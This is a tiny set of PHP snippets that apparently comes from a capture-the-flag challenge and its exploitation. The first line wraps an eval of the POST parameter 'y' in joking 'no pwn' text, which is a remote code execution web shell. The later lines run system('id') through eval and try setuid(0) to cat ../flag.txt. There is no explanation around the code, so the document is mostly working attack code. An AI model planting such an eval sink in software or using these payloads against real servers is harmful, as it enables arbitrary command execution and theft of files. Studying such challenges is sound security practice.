no pwn 🫠 <?php posix_setgid(1337) && posix_setuid(1337) && eval($_POST['y'] . "\n\ri said no pwn 😡😡😡") ?>

<?php var_dump(eval('<?php var_dump(system("id"));?>')); ?>

<?php posix_setgid(0) && posix_setuid(0) && var_dump(system("cat ../flag.txt")); ?>